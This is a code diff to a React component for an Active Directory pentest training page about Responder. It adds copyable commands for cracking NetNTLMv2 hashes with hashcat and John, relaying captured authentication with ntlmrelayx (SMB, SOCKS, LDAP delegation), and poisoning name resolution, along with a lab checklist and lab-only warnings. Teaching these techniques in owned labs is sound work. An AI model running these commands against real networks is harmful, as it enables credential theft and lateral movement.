@@ -1,22 +1,26 @@
 'use client'
 
 // src/components/coach/ResponderCoach.tsx
-import { useState, useCallback, useMemo } from 'react'
+import { useState, useCallback, useMemo, useEffect, useRef } from 'react'
 import {
   BookOpen, Terminal, AlertTriangle, Target, Copy, Shield,
-  Zap, CheckCircle, Lock, Eye, Lightbulb
-  
-  } from 'lucide-react'
+  Zap, CheckCircle, Lock, Eye, Lightbulb, ListChecks, RotateCcw,
+  Search, Menu
+} from 'lucide-react'
 
-type Tab = 'overview' | 'howitworks' | 'commands' | 'scenarios' | 'defense'
+type Tab = 'overview' | 'howitworks' | 'commands' | 'scenarios' | 'defense' | 'checklist' | 'relay'
+
+const STORAGE_CHECKLIST = 'siren_lab_checklist_v1'
 
 // ─── STATIC DATA ───
 const tabs: ReadonlyArray<{ id: Tab; label: string; icon: React.ElementType }> = [
   { id: 'overview', label: 'Overview', icon: BookOpen },
   { id: 'howitworks', label: 'How It Works', icon: Target },
   { id: 'commands', label: 'Useful Commands', icon: Terminal },
+  { id: 'relay', label: 'Relay Lab Notes', icon: Zap },
   { id: 'scenarios', label: 'Attack Scenarios', icon: Shield },
   { id: 'defense', label: 'Detection & Defense', icon: AlertTriangle },
+  { id: 'checklist', label: 'Lab Checklist', icon: ListChecks },
 ]
 
 const commandExamples = [
@@ -67,6 +71,24 @@ const commandExamples = [
     title: 'Fingerprint a Host',
     cmd: 'python3 RunFinger.py -i 10.10.10.5',
     desc: "Responder's fingerprinting script — identifies OS and services on a target without poisoning"
+  },
+  {
+    id: 'hashcat-ntlmv2',
+    title: 'Crack captured NTLMv2 (lab)',
+    cmd: 'hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt',
+    desc: 'Mode 5600 = NetNTLMv2. Only against hashes from your authorized lab captures.'
+  },
+  {
+    id: 'john-ntlmv2',
+    title: 'John the Ripper NTLMv2 (lab)',
+    cmd: 'john --format=netntlmv2 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt',
+    desc: 'Alternative offline crack path for lab hashes.'
+  },
+  {
+    id: 'responder-config',
+    title: 'Edit Responder.conf (lab)',
+    cmd: 'sudo nano /etc/responder/Responder.conf',
+    desc: 'Toggle servers (SMB/HTTP/LDAP) and Challenge value. Keep a backup of the stock config.'
   }
 ]
 
@@ -106,6 +128,42 @@ const scenarios = [
     title: 'MultiRelay Post-Exploitation',
     desc: 'After a relay succeeds, use MultiRelay.py to execute commands, dump SAM, or drop an implant on the relayed-to host as part of a broader lateral movement chain.'
   }
+]
+
+const relayLabNotes = [
+  {
+    id: 'ntlmrelayx-smb',
+    title: 'ntlmrelayx → SMB (signing off)',
+    cmd: 'sudo ntlmrelayx.py -tf targets.txt -smb2support',
+    desc: 'Relay captured auth to hosts in targets.txt. Disable Responder SMB/HTTP when relaying those protocols to avoid conflict.'
+  },
+  {
+    id: 'ntlmrelayx-socks',
+    title: 'ntlmrelayx SOCKS + interactive',
+    cmd: 'sudo ntlmrelayx.py -tf targets.txt -socks -smb2support',
+    desc: 'Opens a SOCKS proxy for tools that speak through the relayed session (lab only).'
+  },
+  {
+    id: 'ntlmrelayx-ldap',
+    title: 'ntlmrelayx → LDAP (lab RBCD path)',
+    cmd: 'sudo ntlmrelayx.py -t ldap://dc.lab.local --delegate-access',
+    desc: 'Educational lab path for RBCD-style LDAP relay. Only on domains you own.'
+  },
+  {
+    id: 'responder-disable-conflict',
+    title: 'Responder without SMB/HTTP servers',
+    cmd: 'sudo responder -I eth0 -w -d -v --disable-smb --disable-http',
+    desc: 'Poison + capture while leaving SMB/HTTP free for ntlmrelayx listeners.'
+  },
+]
+
+const checklistItems = [
+  { id: 'lab-seg', label: 'Isolated lab segment ready', detail: 'GOAD / HTB / home AD lab — not production' },
+  { id: 'analyze-first', label: 'Run analyze mode first (-A)', detail: 'See traffic without poisoning' },
+  { id: 'capture-once', label: 'Capture one lab NTLMv2 hash', detail: 'Confirm Responder logs the user' },
+  { id: 'crack-lab', label: 'Crack that hash offline (or fail honestly)', detail: 'hashcat -m 5600 or john' },
+  { id: 'signing-note', label: 'Document whether SMB signing blocked relay', detail: 'Understand why relay failed/succeeded' },
+  { id: 'defend-gpo', label: 'Write the GPO fix for LLMNR/NBT-NS', detail: 'Detection & Defense tab — make it concrete' },
 ]
 
 const defenseDetails = {
@@ -149,6 +207,7 @@ function CopyBtn({
 
   return (
     <button
+      type="button"
       onClick={handleClick}
       className={`text-xs transition-colors flex items-center gap-1 px-2 py-1 rounded hover:bg-white/5 ${
         state === 'copied'
@@ -311,17 +370,40 @@ function HowItWorksPanel() {
 
 function CommandsPanel({
   copiedStates,
-  onCopy
+  onCopy,
+  filter,
+  setFilter,
 }: {
   copiedStates: Record<string, 'idle' | 'copied' | 'failed'>
   onCopy: (id: string, text: string) => void
+  filter: string
+  setFilter: (v: string) => void
 }) {
+  const filtered = commandExamples.filter(item => {
+    const q = filter.trim().toLowerCase()
+    if (!q) return true
+    return item.title.toLowerCase().includes(q) || item.cmd.toLowerCase().includes(q) || item.desc.toLowerCase().includes(q)
+  })
   return (
     <div>
-      <h2 className="text-white font-semibold text-lg text-red-400 mb-4">Useful Responder Commands</h2>
+      <div className="flex flex-wrap items-center justify-between gap-3 mb-4">
+        <h2 className="text-white font-semibold text-lg text-red-400">Useful Responder Commands</h2>
+        <div className="relative">
+          <Search size={12} className="absolute left-3 top-1/2 -translate-y-1/2 text-white/30" />
+          <input
+            value={filter}
+            onChange={e => setFilter(e.target.value)}
+            placeholder="Filter commands…"
+            className="pl-8 pr-3 py-2 w-44 bg-black/30 border border-white/10 rounded-xl text-xs text-white/80 focus:outline-none focus:border-red-500/40"
+          />
+        </div>
+      </div>
 
       <div className="space-y-3">
-        {commandExamples.map((item) => (
+        {filtered.length === 0 && (
+          <div className="text-sm text-white/40 py-6 text-center">No commands match that filter.</div>
+        )}
+        {filtered.map((item) => (
           <div key={item.id} className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
             <div className="text-white font-semibold mb-1">{item.title}</div>
             <div className="flex items-center justify-between bg-black/60 rounded-lg p-3 font-mono text-sm gap-2 flex-wrap">
@@ -424,10 +506,123 @@ function DefensePanel() {
   )
 }
 
+function RelayPanel({
+  copiedStates,
+  onCopy,
+}: {
+  copiedStates: Record<string, 'idle' | 'copied' | 'failed'>
+  onCopy: (id: string, text: string) => void
+}) {
+  return (
+    <div className="space-y-6">
+      <h2 className="text-white font-semibold text-lg text-red-400">Relay Lab Notes</h2>
+      <p className="text-sm text-white/50">
+        Capture and relay are different skills. Practice only on domains and segments you own or have written authorization for.
+        Disable overlapping Responder servers when ntlmrelayx needs the same ports.
+      </p>
+      <div className="space-y-3">
+        {relayLabNotes.map(item => (
+          <div key={item.id} className="p-4 rounded-xl border border-white/10" style={{ background: 'rgba(255,255,255,0.03)' }}>
+            <div className="text-white font-semibold mb-1">{item.title}</div>
+            <div className="flex items-center justify-between bg-black/60 rounded-lg p-3 font-mono text-sm gap-2 flex-wrap">
+              <span className="text-emerald-400 break-all">{item.cmd}</span>
+              <CopyBtn id={item.id} text={item.cmd} state={copiedStates[item.id] || 'idle'} onCopy={onCopy} />
+            </div>
+            <div className="text-xs text-white/30 mt-2">{item.desc}</div>
+          </div>
+        ))}
+      </div>
+      <div className="p-4 rounded-xl border border-red-500/20 flex gap-3" style={{ background: 'rgba(239,68,68,0.06)' }}>
+        <AlertTriangle className="text-red-400 flex-shrink-0 mt-0.5" size={18} />
+        <div className="text-sm text-white/50">
+          <strong className="text-white/70">Lab order:</strong> analyze mode → short poison capture → offline crack attempt → only then try relay against a signing-disabled lab host.
+        </div>
+      </div>
+    </div>
+  )
+}
+
+function ChecklistPanel({
+  checklist,
+  setChecklist,
+}: {
+  checklist: Record<string, boolean>
+  setChecklist: React.Dispatch<React.SetStateAction<Record<string, boolean>>>
+}) {
+  const done = checklistItems.filter(i => checklist[i.id]).length
+  return (
+    <div className="space-y-4">
+      <div className="flex items-center justify-between flex-wrap gap-2">
+        <h2 className="text-white font-semibold text-lg text-red-400 flex items-center gap-2">
+          <ListChecks size={18} /> Lab Checklist
+        </h2>
+        <span className="text-sm text-white/40">{done}/{checklistItems.length} complete</span>
+      </div>
+      <p className="text-sm text-white/50">Hands-on progress for authorized lab segments only. Saved in this browser.</p>
+      <div className="h-2 rounded-full bg-white/10 overflow-hidden">
+        <div className="h-full bg-red-500 transition-all" style={{ width: `${(done / Math.max(1, checklistItems.length)) * 100}%` }} />
+      </div>
+      <div className="space-y-2">
+        {checklistItems.map(item => {
+          const on = !!checklist[item.id]
+          return (
+            <button
+              key={item.id}
+              type="button"
+              onClick={() => setChecklist(prev => ({ ...prev, [item.id]: !prev[item.id] }))}
+              className={`w-full text-left p-4 rounded-xl border transition-colors flex gap-3 ${
+                on ? 'border-emerald-500/30 bg-emerald-500/5' : 'border-white/10 bg-white/5 hover:border-white/20'
+              }`}
+            >
+              <span className="mt-0.5 flex-shrink-0">
+                {on ? <CheckCircle size={18} className="text-emerald-400" /> : <div className="w-[18px] h-[18px] rounded-full border border-white/30" />}
+              </span>
+              <span>
+                <span className={`text-sm font-medium ${on ? 'text-emerald-200/90 line-through' : 'text-white'}`}>{item.label}</span>
+                <span className="block text-xs text-white/40 mt-0.5">{item.detail}</span>
+              </span>
+            </button>
+          )
+        })}
+      </div>
+      {done === checklistItems.length && (
+        <div className="text-sm text-emerald-300/90 p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/20">
+          Checklist complete — rotate lab snapshots and re-run so the flow stays mechanical.
+        </div>
+      )}
+      <button type="button" onClick={() => setChecklist({})} className="text-xs text-white/40 hover:text-white/70 flex items-center gap-1.5">
+        <RotateCcw size={12} /> Reset checklist
+      </button>
+    </div>
+  )
+}
+
 // ─── MAIN COMPONENT ───
 export default function ResponderCoach() {
   const [activeTab, setActiveTab] = useState<Tab>('overview')
   const [copiedStates, setCopiedStates] = useState<Record<string, 'idle' | 'copied' | 'failed'>>({})
+  const [cmdFilter, setCmdFilter] = useState('')
+  const [sidebarOpen, setSidebarOpen] = useState(false)
+  const [checklist, setChecklist] = useState<Record<string, boolean>>(() => {
+    try { return JSON.parse(localStorage.getItem(STORAGE_CHECKLIST) || '{}') } catch { return {} }
+  })
+  const copyTimers = useRef(new Map<string, ReturnType<typeof setTimeout>>())
+
+  useEffect(() => () => {
+    copyTimers.current.forEach(t => clearTimeout(t))
+    copyTimers.current.clear()
+  }, [])
+  useEffect(() => {
+    try { localStorage.setItem(STORAGE_CHECKLIST, JSON.stringify(checklist)) } catch {}
+  }, [checklist])
+  useEffect(() => {
+    if (!sidebarOpen) return
+    const onKey = (e: KeyboardEvent) => { if (e.key === 'Escape') setSidebarOpen(false) }
+    window.addEventListener('keydown', onKey)
+    return () => window.removeEventListener('keydown', onKey)
+  }, [sidebarOpen])
+
+  const checklistDone = checklistItems.filter(i => checklist[i.id]).length
 
   // ─────────────────────────────────────────────────────────────────────────────
   // Clipboard copy with fallback for HTTP/non-secure contexts
@@ -462,14 +657,17 @@ export default function ResponderCoach() {
   const handleCopy = useCallback(async (id: string, text: string) => {
     const ok = await copyToClipboard(text)
     setCopiedStates(prev => ({ ...prev, [id]: ok ? 'copied' : 'failed' }))
-    setTimeout(() => {
+    const prevT = copyTimers.current.get(id)
+    if (prevT) clearTimeout(prevT)
+    const t = setTimeout(() => {
       setCopiedStates(prev => {
-        if (prev[id] === 'idle') return prev
         const next = { ...prev }
         delete next[id]
         return next
       })
+      copyTimers.current.delete(id)
     }, 2000)
+    copyTimers.current.set(id, t)
   }, [copyToClipboard])
 
   // ─────────────────────────────────────────────────────────────────────────────
@@ -515,15 +713,19 @@ export default function ResponderCoach() {
       case 'howitworks':
         return <HowItWorksPanel />
       case 'commands':
-        return <CommandsPanel copiedStates={copiedStates} onCopy={handleCopy} />
+        return <CommandsPanel copiedStates={copiedStates} onCopy={handleCopy} filter={cmdFilter} setFilter={setCmdFilter} />
+      case 'relay':
+        return <RelayPanel copiedStates={copiedStates} onCopy={handleCopy} />
       case 'scenarios':
         return <ScenariosPanel />
       case 'defense':
         return <DefensePanel />
+      case 'checklist':
+        return <ChecklistPanel checklist={checklist} setChecklist={setChecklist} />
       default:
         return null
     }
-  }, [activeTab, copiedStates, handleCopy])
+  }, [activeTab, copiedStates, handleCopy, cmdFilter, checklist])
 
   // ─────────────────────────────────────────────────────────────────────────────
   // Render
@@ -548,26 +750,54 @@ export default function ResponderCoach() {
             </div>
           </div>
           
-          <div className="flex items-center gap-3">
-            <div className="flex items-center gap-2 text-xs text-white/30">
+          <div className="flex items-center gap-2">
+            <div className="hidden sm:flex items-center gap-2 text-xs text-white/30">
               <Shield size={14} className="text-red-400" />
-              <span>v1.0</span>
+              <span>lab guide · {checklistDone}/{checklistItems.length}</span>
             </div>
+            <button
+              type="button"
+              onClick={() => setSidebarOpen(o => !o)}
+              className="lg:hidden w-8 h-8 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-white/40 hover:text-white/70"
+              aria-label="Menu"
+            >
+              <Menu size={14} />
+            </button>
           </div>
         </div>
 
         {/* ── Warning Banner ── */}
-        <div className="rounded-2xl border border-red-500/30 p-4 flex gap-3 mb-6" style={{ background: 'rgba(239,68,68,0.08)' }}>
+        <div className="rounded-2xl border border-red-500/30 p-4 flex gap-3 mb-4" style={{ background: 'rgba(239,68,68,0.08)' }}>
           <AlertTriangle className="text-red-400 mt-0.5 flex-shrink-0" size={18} />
           <div className="text-sm text-red-200/80">
-            <strong>Warning:</strong> Responder is extremely powerful. It can break network authentication and is easily detected.
-            Only use it in authorized engagements. Misuse can have serious consequences.
+            <strong>Lab only:</strong> Responder poisons name resolution on the local segment and is noisy.
+            Use on authorized assessments or isolated labs you own. Misuse outside scope has serious consequences.
           </div>
         </div>
 
+        {sidebarOpen && (
+          <div className="lg:hidden mb-4 rounded-xl border border-white/10 bg-black/40 p-2 space-y-1">
+            {tabs.map(tab => {
+              const Icon = tab.icon
+              return (
+                <button
+                  key={tab.id}
+                  type="button"
+                  onClick={() => { setActiveTab(tab.id); setSidebarOpen(false) }}
+                  className={`w-full flex items-center gap-2 px-3 py-2.5 rounded-lg text-sm ${
+                    activeTab === tab.id ? 'bg-red-500 text-white' : 'text-white/50 hover:bg-white/5'
+                  }`}
+                >
+                  <Icon size={14} /> {tab.label}
+                </button>
+              )
+            })}
+          </div>
+        )}
+
         {/* ── Tabs ── */}
         <div
-          className="flex bg-white/5 rounded-xl p-1 border border-white/10 mb-6 overflow-x-auto"
+          className="hidden lg:flex bg-white/5 rounded-xl p-1 border border-white/10 mb-6 overflow-x-auto"
           role="tablist"
         >
           {tabs.map(tab => {
@@ -582,9 +812,9 @@ export default function ResponderCoach() {
                 aria-selected={isActive}
                 aria-controls={`panel-${tab.id}`}
                 tabIndex={isActive ? 0 : -1}
-                onClick={() => setActiveTab(tab.id)}
+                onClick={() => { setActiveTab(tab.id); setSidebarOpen(false) }}
                 onKeyDown={(e) => handleKeyDown(e, tab.id)}
-                className={`flex items-center gap-2 px-4 py-2 rounded-lg text-sm font-medium transition-all whitespace-nowrap ${
+                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-sm font-medium transition-all whitespace-nowrap ${
                   isActive
                     ? 'bg-red-500 text-white'
                     : 'text-white/40 hover:text-white/70'
